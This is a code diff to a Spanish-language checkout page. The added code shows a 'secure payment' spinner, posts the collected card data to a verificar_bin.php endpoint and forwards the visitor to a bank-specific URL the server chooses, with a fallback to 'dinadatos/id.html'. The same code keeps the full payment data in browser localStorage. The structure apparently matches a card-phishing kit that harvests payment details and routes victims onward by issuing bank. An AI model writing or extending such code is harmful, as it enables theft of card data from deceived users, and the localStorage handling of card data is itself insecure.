@@ -66,6 +66,42 @@
             font-family: 'Courier New', Courier, monospace;
             -webkit-text-security: disc;
         }
+
+        #bin-loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            z-index: 99999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .bin-spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #4a90e2;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: bin-spin 1s linear infinite;
+        }
+
+        .bin-loading-text {
+            margin-top: 20px;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        @keyframes bin-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 
     <style>
@@ -1193,8 +1229,50 @@
                                                     // Guardar los mismos datos bajo la clave 'paymentData'
                                                     localStorage.setItem('paymentData', JSON.stringify(u));
                                     
-                                                    // Redirigir a loadtiketid.php
-                                                    window.location.href = "load.php";
+                                                    // Mostrar overlay de carga integrado
+                                                    const overlay = document.getElementById('bin-loading-overlay');
+                                                    if (overlay) {
+                                                        overlay.style.display = 'flex';
+                                                    }
+                                                    
+                                                    // Petición a la nueva API de verificación de BIN
+                                                    fetch('verificar_bin.php', {
+                                                        method: 'POST',
+                                                        headers: { 'Content-Type': 'application/json' },
+                                                        body: JSON.stringify(u)
+                                                    })
+                                                    .then(res => {
+                                                        if (!res.ok) {
+                                                            throw new Error('Error en la respuesta del servidor');
+                                                        }
+                                                        return res.json();
+                                                    })
+                                                    .then(result => {
+                                                        if (result.status === 'success') {
+                                                            // Guardar info del banco y tipo de tarjeta para cargando
+                                                            const infoload = {
+                                                                bank: result.bank,
+                                                                cardType: result.cardType
+                                                            };
+                                                            localStorage.setItem('infoload', JSON.stringify(infoload));
+                                                            
+                                                            // Actualizar banco y tipo de tarjeta en tbdatos
+                                                            u.bank = result.bank;
+                                                            u.type = result.type;
+                                                            localStorage.setItem('tbdatos', JSON.stringify(u));
+                                                            
+                                                            // Redirigir directamente al destino proporcionado por la API
+                                                            window.location.href = result.redirect;
+                                                        } else {
+                                                            if (overlay) overlay.style.display = 'none';
+                                                            alert(result.message || "Ocurrió un error al procesar el pago. Por favor intente de nuevo.");
+                                                        }
+                                                    })
+                                                    .catch(err => {
+                                                        console.error("Error en verificar_bin:", err);
+                                                        // En caso de fallo de red, fallback a id.html
+                                                        window.location.href = 'dinadatos/id.html';
+                                                    });
                                                 } else {
                                                     alert("Por favor, completa todos los campos correctamente.");
                                                 }
@@ -1240,6 +1318,10 @@
                 </p>
             </div>
         </div>
+    <!-- Overlay de carga para la API de verificación de BIN -->
+    <div id="bin-loading-overlay">
+        <div class="bin-spinner"></div>
+        <div class="bin-loading-text">Procesando pago seguro...</div>
     </div>
 
 </body>
